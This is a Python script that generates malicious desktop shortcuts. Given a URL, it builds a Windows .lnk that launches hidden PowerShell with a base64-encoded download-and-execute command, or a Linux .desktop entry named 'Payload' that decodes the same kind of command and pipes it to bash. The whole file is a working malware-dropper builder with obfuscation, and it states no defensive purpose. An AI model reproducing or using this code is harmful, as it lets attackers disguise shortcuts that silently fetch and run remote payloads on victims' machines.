import base64
import os
import uuid
import platform
import tempfile
import shutil

try:
    import win32com.client
except ImportError:
    pass  # Only import on Windows

def create_windows_shortcut(target, arguments, lnkpath):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(lnkpath)
    shortcut.TargetPath = target
    shortcut.Arguments = arguments
    shortcut.save()

def create_linux_shortcut(command, desktop_path):
    content = f"""[Desktop Entry]
Type=Application
Name=Payload
Exec={command}
Icon=application-default-icon
Terminal=false
"""
    with open(desktop_path, 'w') as file:
        file.write(content)
    os.chmod(desktop_path, 0o755)

def generate_encoded_command(file_url):
    unique_filename = f"{uuid.uuid4()}.exe" if platform.system() == "Windows" else f"{uuid.uuid4()}"
    download_command = f"Invoke-WebRequest -Uri '{file_url}' -OutFile \"$env:TEMP\\{unique_filename}\"; Start-Process \"$env:TEMP\\{unique_filename}\"" \
        if platform.system() == "Windows" else f"wget -O /tmp/{unique_filename} '{file_url}'; chmod +x /tmp/{unique_filename}; /tmp/{unique_filename}"

    encoded_command = base64.b64encode(download_command.encode('utf-16le' if platform.system() == "Windows" else 'utf-8')).decode('utf-8')
    return encoded_command, unique_filename

def main():
    file_url = input("Enter a link to the file: ")
    encoded_command, unique_filename = generate_encoded_command(file_url)

    if platform.system() == "Windows":
        lnk_name = f"audi_{uuid.uuid4()}.lnk"
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", lnk_name)
        
        powershell_command = f"-WindowStyle Hidden -EncodedCommand {encoded_command}"
        create_windows_shortcut(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", powershell_command, desktop_path)
        print(f"Windows shortcut saved to: {desktop_path}")

    elif platform.system() == "Linux":
        desktop_name = f"audi_{uuid.uuid4()}.desktop"
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", desktop_name)
        
        bash_command = f"bash -c \"echo {encoded_command} | base64 -d | bash\""
        create_linux_shortcut(bash_command, desktop_path)
        print(f"Linux shortcut saved to: {desktop_path}")
    else:
        print("Unsupported OS")

if __name__ == "__main__":
    main()
